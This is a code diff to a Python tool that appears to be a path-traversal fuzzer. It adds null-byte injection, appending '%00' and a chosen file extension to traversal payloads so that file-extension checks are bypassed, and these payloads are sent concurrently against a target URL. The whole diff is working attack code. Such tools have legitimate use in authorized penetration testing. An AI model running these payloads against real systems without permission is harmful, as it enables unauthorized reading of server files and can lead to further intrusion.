@@ -77,6 +77,15 @@ def forloop(arguments):
                     if fullrewrite not in duplicate:
                         duplicate.add(fullrewrite)
                         tasks.append((fullrewrite, regex_pattern))
+                    
+                    # null byte injection when extension is provided
+                    if arguments.extension:
+                        for ext in arguments.extension:
+                            null_byte_rewrite = bvar + (var * count) + word + "%00" + ext
+                            null_byte_fullrewrite = re.sub(re.escape(arguments.string), lambda m: null_byte_rewrite, arguments.url)
+                            if null_byte_fullrewrite not in duplicate:
+                                duplicate.add(null_byte_fullrewrite)
+                                tasks.append((null_byte_fullrewrite, regex_pattern))
         if tasks:
             # Use a ThreadPoolExecutor to run requests concurrently.
             with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
@@ -93,6 +102,7 @@ if __name__ == '__main__':
     parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie.')
     parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, default=6, help='How deep we will go?')
     parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Show requests')
+    parser.add_argument('--extension', '-e', action='append', dest='extension', required=False, help='File extension for null byte injection (e.g., ".png", ".txt"). Can be used multiple times.')
     arguments = parser.parse_args()
 
     banner = "\
